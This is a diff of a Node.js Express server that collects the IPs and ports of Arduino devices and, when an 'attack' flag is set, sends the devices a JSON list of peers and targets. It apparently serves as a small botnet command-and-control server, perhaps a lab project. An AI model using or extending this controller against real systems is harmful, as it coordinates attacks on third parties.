@@ -41,12 +41,16 @@ app.post("/ips", function(req, res) {
     ipPort.port = port;
 
     ipPortPair.push(ipPort);
+    console.log(ipPortPair);
     res.end("ok. IP, port Received");
 });
 
 
 app.post("/", function(req, res){
   
+  //console.log("Attack :");
+  //console.log(attack);
+
   var id = req.body.id;
   var datetime = req.body.datetime;
   var sensorData = req.body.data;
@@ -56,25 +60,9 @@ app.post("/", function(req, res){
     //Default delay is 1 second
     knownIds[id] = {time:1000, changed:false};
     //console.log(knownIds);
-
-    if(!attack) {
-      res.end("ok");
-    } else {
-      /*{
-          arduino:[{ip:2.1.3, port:123},...],
-          targets:[{ip:2.1.3, port:123},...]
-        }
-      */
-      
-      var content = {};
-      content.arduinos = ipPortPair;
-      content.targets = targetJson;
-      console.log("Content:");
-      console.log(content);
-      res.writeHead(200, {'Content-Type': 'application/json'});
-      //res.send();
-    }
-  } else {
+  } 
+  else
+  {
     //send the new delay value
     if(knownIds[id].changed == true) { 
       res.setHeader('Content-Length', knownIds[id].time.toString().length);
@@ -83,13 +71,37 @@ app.post("/", function(req, res){
       res.end();
 
       knownIds[id].changed = false;
-    } else {
-      res.end("ok");
+    } 
+    else 
+    {
+      //res.end("ok");
+      if(!attack) 
+      {
+          console.log("OK");
+          res.end("ok");
+      } 
+      else 
+      {
+          /*{
+              arduino:[{ip:2.1.3, port:123},...],
+              targets:[{ip:2.1.3, port:123},...]
+            }
+          */
+          var content = {};
+          content.arduinos = ipPortPair;
+          content.targets = targetJson;
+          console.log("Content:");
+          console.log(content);
+          res.setHeader('Content-Type', 'application/json');
+          res.send(JSON.stringify(content));
+          attack = false;
+        }
     }
 
   }
+  
 
-  console.log(knownIds);
+  //console.log(knownIds);
 
   var date = new Date();
   var ms = date.getMilliseconds();
